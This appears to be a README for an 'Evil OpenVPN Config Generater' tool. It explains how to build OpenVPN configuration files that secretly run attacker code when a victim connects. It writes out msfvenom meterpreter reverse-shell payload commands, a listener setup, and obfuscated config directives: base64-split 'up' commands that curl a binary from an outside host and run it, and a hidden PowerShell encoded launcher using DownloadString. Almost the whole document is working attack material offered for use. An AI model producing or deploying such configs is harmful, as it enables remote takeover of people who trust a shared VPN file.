# Evil OpenVPN Config Generater

# Linux

## Usage

```bash
msfvenom -p linux/x86/meterpreter_reverse_https LHOST=192.168.114.165 LPORT=8080 -o a -f elf

python3 generate_linux.py http://192.168.114.165/a

# host the launcher pe
python3 -m http.server 80

# start to listen
msfconsole -r linux_listen.rc

# when some guys use the evil config file, and we got an meterpreter session
sudo openvpn --config evil.ovpn
```

## detail

```bash
# this is the part of the config file
setenv a1 "Y3VybCBodHRwOi8vMTI3Lj"
setenv a2 "AuMC4xL2EgLXMgLW8gL3Rt"
setenv a3 "cC9hICYmIGNobW9kICt4IC"
setenv a4 "90bXAvYSAmJiAvdG1wL2E="
up "/bin/bash -c 'echo $a1$a2$a3$a4|base64 -d|bash'"

# it will execute this command totaly 
curl http://192.168.114.165/a -s -o /tmp/a && chmod +x /tmp/a && /tmp/a
```

# Win
## Usage
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64

powershell -ep bypass -f generate_win.ps1
> Please enter your download url, Ex: http://192.168.114.165/a.ps1 :: http://192.168.114.165/a.ps1
> Please enter your script name, Ex: a.ps1 :: a.ps1
> iex(New-Object Net.WebClient).DownloadString('http://192.168.114.165/a.ps1');a.ps1
> generate shellcode command: msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.114.165 lport=8888 -f base64
> Please enter your shellcode :: shellcode
> [*] Done! Host your evil.ps1 by 'python3 -m http.server 80' on your vps
> [+] please look at evil.ovpn, and show me your SET skill

# host the launcher pe
python3 -m http.server 80

# start to listen
msfconsole -r win_listen.rc

# when some guys use the evil config file, and we got an meterpreter session
```

## detail

```bash
# this is the part of the config file
setenv k0 xxx
setenv k1 xxx
setenv k2 xxx
setenv k3 xxx
setenv kk 'start /min /b powershell /w hidden /enc %k0%%k1%%k2%%k3%'
up 'C:\\Windows\\System32\\cmd.exe /c "(%kk%)|cmd"'

# it will execute this command totaly 
C:\\Windows\\System32\\cmd.exe /c "start /min /b powershell /w hidden /enc encoded_shellcode|cmd"
```

